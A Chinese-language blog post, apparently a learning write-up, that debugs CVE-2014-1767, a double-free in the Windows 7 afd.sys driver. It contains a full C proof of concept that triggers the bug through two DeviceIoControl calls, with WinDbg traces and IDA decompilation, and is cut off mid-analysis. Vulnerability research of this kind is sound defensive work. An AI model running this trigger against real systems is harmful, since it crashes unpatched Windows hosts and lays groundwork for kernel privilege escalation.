<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
</head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-cve-2014-1767" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/11/29/cve-2014-1767/" class="article-date">
  <time datetime="2019-11-29T07:59:57.383Z" itemprop="datePublished">2019-11-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/11/29/cve-2014-1767/">cve-2014-1767</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>这个漏洞算是Windows Kernel很经典的一个洞了，且各个方面都不算复杂，而UAF在内存损坏漏洞中是很常见的一种，适合入门。这里详细记录一下调试过程和一些分析思路。</p>
<h5 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h5><p>windows 7 x86 sp1</p>
<h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>这个漏洞的本质是，进行异常处理时，在afd!AfdReturnTpInfo函数中，tpInfo对象的mdl成员在释放后没有置空，造成了一个悬挂指针，一旦对该指针进行二次释放，就会引起Crash。</p>
<p>接下来我们主要调试poc来分析漏洞触发的一些细节，poc如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"WS2_32.lib"</span>)</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"><span class="function"></span>&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">	DWORD targetSize = <span class="number">0x310</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">	DWORD virtualAddress = <span class="number">0x13371337</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">	DWORD mdlSize = (<span class="number">0x4000</span> * (targetSize - <span class="number">0x30</span>) / <span class="number">8</span>) - <span class="number">0xFFF0</span> - (virtualAddress &amp; <span class="number">0xFFF</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">	<span class="keyword">static</span> DWORD inbuf1[<span class="number">100</span>];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">	<span class="built_in">memset</span>(inbuf1, <span class="number">0</span>, <span class="keyword">sizeof</span>(inbuf1));</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">	inbuf1[<span class="number">6</span>] = virtualAddress;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">	inbuf1[<span class="number">7</span>] = mdlSize;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">	inbuf1[<span class="number">10</span>] = <span class="number">1</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">	<span class="keyword">static</span> DWORD inbuf2[<span class="number">100</span>];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">	<span class="built_in">memset</span>(inbuf2, <span class="number">0</span>, <span class="keyword">sizeof</span>(inbuf2));</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">	inbuf2[<span class="number">0</span>] = <span class="number">1</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">	inbuf2[<span class="number">1</span>] = <span class="number">0x0AAAAAAA</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">	WSADATA WSAData;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">	SOCKET s;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">	SOCKADDR_IN sa;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">	<span class="keyword">int</span> ierr;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">	WSAStartup(<span class="number">0x2</span>, &amp;WSAData);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">	s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">	<span class="built_in">memset</span>(&amp;sa, <span class="number">0</span>, <span class="keyword">sizeof</span>(sa));</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">	sa.sin_port = htons(<span class="number">135</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">	sa.sin_addr.S_un.S_addr = inet_addr(<span class="string">"127.0.0.1"</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">	sa.sin_family = AF_INET;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">	ierr = <span class="built_in">connect</span>(s, (<span class="keyword">const</span> struct sockaddr*) &amp; sa, <span class="keyword">sizeof</span>(sa));</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">	<span class="keyword">static</span> <span class="keyword">char</span> outBuf[<span class="number">100</span>];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">	DWORD bytesRet;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">	__debugbreak();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">	DeviceIoControl((HANDLE)s, <span class="number">0X1207F</span>, (LPVOID)inbuf1, <span class="number">0x30</span>, outBuf, <span class="number">0</span>, &amp;bytesRet, <span class="literal">NULL</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line">	DeviceIoControl((HANDLE)s, <span class="number">0X120C3</span>, (LPVOID)inbuf2, <span class="number">0x18</span>, outBuf, <span class="number">0</span>, &amp;bytesRet, <span class="literal">NULL</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<p>windbg连接后运行poc，就会触发异常，先进行栈回溯</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">kd&gt; kb</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"> # ChildEBP RetAddr  Args to Child              </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">00 9859554c 83efa083 00000003 395c7f7f 00000065 nt!RtlpBreakWithStatusInstruction</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">01 9859559c 83efab81 00000003 85eb6000 000001ff nt!KiBugCheckDebugBreak+0x1c</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">02 98595960 83f3cc6b 000000c2 00000007 00001097 nt!KeBugCheck2+0x68b</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">03 985959d8 83ea7ec2 85eb6008 00000000 85eb5700 nt!ExFreePoolWithTag+0x1b1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">04 985959ec 8e673eb0 85eb6008 00000000 8e65689f nt!IoFreeMdl+0x70</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">05 98595a08 8e6568ac 00000000 00000001 163d9eb0 afd!AfdReturnTpInfo+0xad</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">06 98595a44 8e657bba 163d9e18 000120c3 8e657a8c afd!AfdTliGetTpInfo+0x89</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">07 98595aec 8e65c2bc 85eb3038 863073e8 98595b14 afd!AfdTransmitPackets+0x12e</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">08 98595afc 83e52593 863073e8 87409488 87409488 afd!AfdDispatchDeviceControl+0x3b</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">09 98595b14 8404699f 85eb3038 87409488 87409564 nt!IofCallDriver+0x63</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">0a 98595b34 84049b71 863073e8 85eb3038 00000000 nt!IopSynchronousServiceTail+0x1f8</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">0b 98595bd0 840903f4 863073e8 87409488 00000000 nt!IopXxxControlFile+0x6aa</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">0c 98595c04 83e591ea 0000005c 00000000 00000000 nt!NtDeviceIoControlFile+0x2a</span></pre></td></tr></table></figure>

<p>这里我们可以看到一个很清晰的调用链，即</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">AfdDispatchDeviceControl-&gt;AfdTransmitPackets-&gt;AfdTliGetTpInfo-&gt;AfdReturnTpInfo-&gt;IoFreeMdl</span></pre></td></tr></table></figure>

<p>不过我们的poc中调用了两次DeviceIoControl，并发送了不同的控制码，那么可以推断，这里的调用链是第二次调用DeviceIoControl时的情况。要对目标进行比较完整的分析，则我们需要找到第一次调用DeviceControl时的情况，所以需要找到控制码为0x1207F时的一系列调用。</p>
<p>有一点驱动开发基础的同学应该知道，每个驱动对象都有许多分发函数，用于系统回调。其中根据控制码来进行相应操作的是IRP_MJ_DEVICE_CONTROL例程，我们可以通过windbg来查看afd.sys的该例程的对应符号。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">kd&gt; !drvobj afd 2</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">Driver object (86307718) is for:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"> \Driver\AFD</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">DriverEntry:   8e67f63d	afd!GsDriverEntry</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">DriverStartIo: 00000000	</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">DriverUnload:  8e6545b6	afd!AfdUnload</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">AddDevice:     00000000	</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">Dispatch routines:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">[00] IRP_MJ_CREATE                      8e65e190	afd!AfdDispatch</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">[01] IRP_MJ_CREATE_NAMED_PIPE           8e65e190	afd!AfdDispatch</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">[02] IRP_MJ_CLOSE                       8e65e190	afd!AfdDispatch</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">[03] IRP_MJ_READ                        8e65e190	afd!AfdDispatch</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">[04] IRP_MJ_WRITE                       8e65e190	afd!AfdDispatch</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">[05] IRP_MJ_QUERY_INFORMATION           8e65e190	afd!AfdDispatch</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">[06] IRP_MJ_SET_INFORMATION             8e65e190	afd!AfdDispatch</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">[07] IRP_MJ_QUERY_EA                    8e65e190	afd!AfdDispatch</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">[08] IRP_MJ_SET_EA                      8e65e190	afd!AfdDispatch</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">[09] IRP_MJ_FLUSH_BUFFERS               8e65e190	afd!AfdDispatch</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">[0a] IRP_MJ_QUERY_VOLUME_INFORMATION    8e65e190	afd!AfdDispatch</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">[0b] IRP_MJ_SET_VOLUME_INFORMATION      8e65e190	afd!AfdDispatch</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">[0c] IRP_MJ_DIRECTORY_CONTROL           8e65e190	afd!AfdDispatch</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">[0d] IRP_MJ_FILE_SYSTEM_CONTROL         8e65e190	afd!AfdDispatch</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">[0e] IRP_MJ_DEVICE_CONTROL              8e65c281	afd!AfdDispatchDeviceControl</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">······</span></pre></td></tr></table></figure>

<p>可以看到该例程正是afd!AfdDispatchDeviceControl，用IDA反编译一下该函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">stdcall <span class="title">AfdDispatchDeviceControl</span><span class="params">(<span class="keyword">int</span> a1, PIRP Irp)</span></span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="function"></span>&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">  _IO_STACK_LOCATION *v2; <span class="comment">// edx</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">  <span class="keyword">int</span> (*v4)(<span class="keyword">void</span>); <span class="comment">// esi</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">  v2 = Irp-&gt;Tail.Overlay.CurrentStackLocation;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">  v3 = (v2-&gt;Parameters.Read.ByteOffset.LowPart &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x3FF</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="number">0x46</span> &amp;&amp; AfdIoctlTable[v3] == v2-&gt;Parameters.Others.Argument3 )</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">  &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">    v2-&gt;MinorFunction = v2-&gt;Parameters.Read.ByteOffset.LowPart &gt;&gt; <span class="number">2</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">    v4 = (<span class="keyword">int</span> (*)(<span class="keyword">void</span>))AfdIrpCallDispatch[v3];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> ( v4 )</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">      <span class="keyword">return</span> v4(); <span class="comment">//根据控制码决定要运行的函数</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">  &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">  Irp-&gt;IoStatus.Status = <span class="number">0xC0000010</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">  IofCompleteRequest(Irp, AfdPriorityBoost);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">  <span class="keyword">return</span> <span class="number">0xC0000010</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<p>所以我们可以通过调试找到控制码为0x1207F对应的函数。首先在这里下断点，然后运行poc，接着到调用处</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">kd&gt; bp afd!AfdDispatchDeviceControl</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">kd&gt; g</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">Breakpoint 0 hit</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">afd!AfdDispatchDeviceControl:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">0008:8e65c281 8bff            mov     edi,edi</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">······</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">kd&gt; p</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">afd!AfdDispatchDeviceControl+0x39:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">0008:8e65c2ba ffd6            call    esi</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">kd&gt; t</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">afd!AfdTransmitFile:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">0008:8e65731e 6884000000      push    84h</span></pre></td></tr></table></figure>

<p>可以看到进入了AfdTransmitFile函数，我们用IDA来分析它。这里需要说的一点是，这个函数使用了许多异常处理操作，用IDA进行反编译的效果不如直接看汇编。前面都是一些和输入的比对，步过就行。接下来我们的poc会走下图左边的分支，关键的函数是AfdTliGetTpInfo，该函数在第二次调用DeviceIoControl的调用链中也出现了</p>
<p><img src="/.com//../../../image-20191111180502905.png" alt="image-20191111180502905"></p>
<p>AfdTliGetTpInfo的功能主要是返回一个tpInfo对象并对其初始化，其中会调用ExAllocateFromNPagedLookasideList函数来分配空间，其内部如下</p>
<p><img src="/.com//../../../cve-2014-1767/image-20191111181801926.png" alt="image-20191111181801926"></p>
<p>在调试的过程中可以发现，这里的分支会走中间的基本块，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">kd&gt; p</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">afd!ExAllocateFromNPagedLookasideList+0xe:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">0008:8e63c5ac ff1588a2648e    call    dword ptr [afd!_imp_InterlockedPopEntrySList (8e64a288)]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">kd&gt; p</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">afd!ExAllocateFromNPagedLookasideList+0x14:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">0008:8e63c5b2 85c0            test    eax,eax</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">kd&gt; r</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">eax&#x3D;00000000 ebx&#x3D;944071f0 ecx&#x3D;00000000 edx&#x3D;00000000 esi&#x3D;86307238 edi&#x3D;00000003</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">eip&#x3D;8e63c5b2 esp&#x3D;93b27a04 ebp&#x3D;93b27a08 iopl&#x3D;0         nv up ei ng nz na po nc</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">cs&#x3D;0008  ss&#x3D;0010  ds&#x3D;0023  es&#x3D;0023  fs&#x3D;0030  gs&#x3D;0000             efl&#x3D;00000282</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">afd!ExAllocateFromNPagedLookasideList+0x14:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">0008:8e63c5b2 85c0            test    eax,eax</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">······</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">kd&gt; t</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">afd!ExAllocateFromNPagedLookasideList+0x24:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">0008:8e63c5c2 ff5628          call    dword ptr [esi+28h]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">kd&gt; t</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">afd!AfdAllocateTpInfo:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">0008:8e673f0a 8bff            mov     edi,edi</span></pre></td></tr></table></figure>

<p>所以我们跟到call指令调用的函数中，这里是AfdAllocateTpInfo，再用IDA查看该函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">PVOID __<span class="function">stdcall <span class="title">AfdAllocateTpInfo</span><span class="params">(POOL_TYPE PoolType, SIZE_T NumberOfBytes, ULONG Tag)</span></span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="function"></span>&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">  PVOID v3; <span class="comment">// esi</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">  v3 = ExAllocatePoolWithTagPriority(PoolType, NumberOfBytes, Tag, <span class="number">0</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ( v3 )</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">    AfdInitializeTpInfo(v3, AfdDefaultTpInfoElementCount, AfdTdiStackSize, <span class="number">1</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">  <span class="keyword">return</span> v3;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<p>于是我们就找到了分配内存的时机，重新回到AfdTransmitFile函数中，此时刚调用完AfdTliGetTpInfo函数，这使我们获得了一个tpInfo对象，之后调用的两个函数很关键</p>
<p><img src="/.com//../../../cve-2014-1767/image-20191111182810227.png" alt="image-20191111182810227"></p>
<p>分别调试到对应位置查看其参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">afd!AfdTransmitFile+0x16a:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">0008:8e657488 ff1580a2648e    call    dword ptr [afd!_imp__IoAllocateMdl (8e64a280)] ds:0023:8e64a280&#x3D;&#123;nt!IoAllocateMdl (83eb04f5)&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">kd&gt; dd esp</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">93b27a34  13371337 0015fcd9 00000000 00000001</span></pre></td></tr></table></figure>

<p>可以看到这里的参数1为0x13371337，这是我们poc中设置的，因此这里Mdl会被分配到该位置，然后断在MmProbeAndLockPages处，我们会发现13371337地址是无效的，于是会触发异常</p>
